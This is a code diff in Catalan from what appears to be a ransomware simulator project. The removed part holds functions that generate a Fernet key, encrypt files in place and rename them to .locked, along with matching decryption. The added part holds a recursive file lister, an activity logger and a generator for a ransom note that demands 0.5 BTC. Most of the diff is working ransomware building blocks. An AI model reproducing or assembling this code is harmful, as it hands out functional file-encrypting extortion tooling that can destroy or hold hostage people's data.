@@ -1,47 +1,47 @@
 import os
-from cryptography.fernet import Fernet, InvalidToken
-import file_manager
+from datetime import datetime
 
-def generar_i_guardar_clau(ruta):
-    clau = Fernet.generate_key()
+RUTA_LOGS = os.path.join("logs", "activity.log")
+
+def llistar_fitxers(ruta):
+    llista_final = []
+    if os.path.exists(ruta):
+        for arrel, directoris, fitxers in os.walk(ruta):
+            for nom in fitxers:
+                llista_final.append(os.path.join(arrel, nom))
+        return llista_final
+    return []
+
+def registrar_log(missatge, nivell):
+    carpeta_logs = os.path.dirname(RUTA_LOGS)
+    if not os.path.exists(carpeta_logs):
+        os.makedirs(carpeta_logs)
+    data = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    linia = f"[{data}] [{nivell}] {missatge}\n"
+    with open(RUTA_LOGS, "a", encoding="utf-8") as f:
+        f.write(linia)
+
+def llegir_logs():
+    if os.path.exists(RUTA_LOGS):
+        with open(RUTA_LOGS, "r", encoding="utf-8") as f:
+            print(f.read())
+    else:
+        print("No hi ha logs disponibles.")
+
+def generar_nota_rescat(directori):
+    contingut = (
+        "HEM XIFRAT ELS TEUS FITXERS!\n\n"
+        "Per recuperar les teves dades, necessites la clau de desxifratge.\n"
+        "1. No intentis modificar els fitxers .locked.\n"
+        "2. Envia 0.5 BTC a l'adreca: bc1qxy2kgdy6jrsqx7644vvv\n"
+        "3. Un cop pagat, envia un correu a: support@simulador.com\n"
+    )
+
+    ruta_nota = os.path.join(directori, "INSTRUCCIONS_RECUPERACIO.txt")
+    
     try:
-        with open(ruta, "wb") as clau_file:
-            clau_file.write(clau)
-        file_manager.registrar_log(f"CLAU GENERADA A {ruta}", "INFO")
+        with open(ruta_nota, "w", encoding="utf-8") as f:
+            f.write(contingut)
+        print(f"[+] Nota de rescat creada a: {ruta_nota}")
     except Exception as e:
-        print(f"[X] ERROR GENERANT CLAU: {e}")
-
-def carregar_clau(ruta):
-    if not os.path.exists(ruta):
-        return None
-    try:
-        with open(ruta, "rb") as file:
-            return file.read()
-    except Exception:
-        return None
-
-def xifrar_arxiu(ruta, clau):
-    try:
-        f = Fernet(clau)
-        with open(ruta, "rb") as file:
-            dades = file.read()
-        encriptat = f.encrypt(dades)
-        with open(ruta, "wb") as file:
-            file.write(encriptat)
-        os.rename(ruta, ruta + ".locked")
-    except Exception as e:
-        print(f"Error xifrant {ruta}: {e}")
-
-def desxifrar_arxiu(ruta, clau):
-    try:
-        f = Fernet(clau)
-        with open(ruta, "rb") as file:
-            dades = file.read()
-        desencriptat = f.decrypt(dades)
-        original = ruta.replace(".locked", "")
-        with open(ruta, "wb") as file:
-            file.write(desencriptat)
-        os.rename(ruta, original)
-    except Exception as e:
-        print(f"Error desxifrant {ruta}: {e}")
-
+        print(f"[X] ERROR CREANT LA NOTA: {e}")
